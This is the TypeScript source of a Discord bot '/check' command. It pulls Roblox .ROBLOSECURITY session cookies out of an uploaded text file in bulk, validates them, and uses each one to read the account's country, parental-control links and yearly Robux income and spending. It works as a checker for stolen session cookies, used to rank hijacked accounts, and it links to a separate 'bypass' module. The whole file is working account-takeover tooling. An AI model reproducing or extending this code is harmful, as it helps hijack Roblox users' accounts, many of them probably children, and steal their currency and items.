import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
} from 'discord.js';
import axios from 'axios';
import { validateCookie } from '../roblox';
import { buildInitialButtons as storeAndBuildRow } from './bypass';
import type { Command } from './types';

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(
    fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)),
  );
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) {
      seen.add(bare);
      result.push(full);
    }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) {
      seen.add(bare);
      result.push(bare);
    }
  }
  return result;
}

async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
  try {
    const url = `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`;
    const resp = await axios.get(url, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200 && resp.data) {
      return {
        incoming: resp.data.incomingRobuxTotal || 0,
        outgoing: resp.data.outgoingRobuxTotal || 0,
      };
    }
  } catch {}
  return { incoming: 0, outgoing: 0 };
}

async function fetchCountry(cookie: string): Promise<string> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });
    if (resp.status === 200) {
      const data = await resp.json();
      return data.value?.countryName || 'Unknown';
    }
  } catch {}
  return 'Unknown';
}

async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean; canAddParent: boolean }> {
  try {
    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });
    if (resp.status === 200) {
      const data = await resp.json();
      return {
        hasParent: (data.parents && data.parents.length > 0) || false,
        canAddParent: data.canAddParent || false,
      };
    }
  } catch {}
  return { hasParent: false, canAddParent: false };
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ ephemeral: true });

    const timestamp = new Date().toLocaleString();
    const footerData = {
      text: `${interaction.user.username} | ${timestamp}`,
      iconURL: interaction.user.displayAvatarURL(),
    };

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Invalid File')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ Please attach a `.txt` file.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Download Failed')
        .setColor('#FFFFFF')
        .setDescription(`✧ **Error**\n────\n⭑ ${err.message || 'Could not fetch file.'}`)
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 No Cookies Found')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = new EmbedBuilder()
      .setTitle('𖣐 Processing .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(`✧ **Status:** Scanning ${cookies.length} cookie(s)...\n────\n⭑ Validating each and fetching details.`)
      .setFooter(footerData);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let totalIncoming = 0;
    let totalOutgoing = 0;

    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i];
      const validation = await validateCookie(cookie);
      if (!validation.valid) continue;

      validCount++;
      const { userId, username, displayName } = validation;
      const [tx, country, parental] = await Promise.all([
        fetchTransactionTotals(cookie, String(userId)),
        fetchCountry(cookie),
        fetchParentalControls(cookie),
      ]);
      totalIncoming += tx.incoming;
      totalOutgoing += tx.outgoing;

      const parentStatus = parental.hasParent ? '✅ Linked' : '❌ None';

      const id = Math.random().toString(36).slice(2, 10);
      const row = storeAndBuildRow(id);

      const embed = new EmbedBuilder()
        .setTitle(`𖣐 Valid Cookie #${validCount}`)
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **User**\n` +
          `────\n` +
          `⭑ **Username:** ${username}\n` +
          `⭑ **Display:** ${displayName || username}\n` +
          `⭑ **User ID:** ${userId}\n` +
          `⭑ **Country:** ${country}\n` +
          `────\n` +
          `✧ **Account Details**\n` +
          `────\n` +
          `⭑ **Parental Controls:** ${parentStatus}\n` +
          `────\n` +
          `✧ **Robux Summary (Year)**\n` +
          `────\n` +
          `⭑ **Incoming:** ${tx.incoming.toLocaleString()} ₽\n` +
          `⭑ **Outgoing:** ${tx.outgoing.toLocaleString()} ₽\n` +
          `────\n` +
          `⭑ Your credentials were not logged.`
        )
        .setFooter(footerData);

      await interaction.followUp({ embeds: [embed], components: [row], ephemeral: true });
    }

    const summaryEmbed = new EmbedBuilder()
      .setTitle(validCount === 0 ? '𖣐 No Valid Cookies' : '𖣐 Scan Complete .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        validCount === 0
          ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Incoming:** ${totalIncoming.toLocaleString()} ₽\n⭑ **Total Outgoing:** ${totalOutgoing.toLocaleString()} ₽`
      )
      .setFooter(footerData);

    await interaction.followUp({ embeds: [summaryEmbed], ephemeral: true });
  } catch (error: any) {
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Error .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        `✧ **Unexpected Error**\n` +
        `────\n` +
        `⭑ ${error.message || 'Something went wrong.'}`
      )
      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
    await interaction.editReply({ embeds: [embed] });
  }
}

export const checkCommand: Command = { data, execute };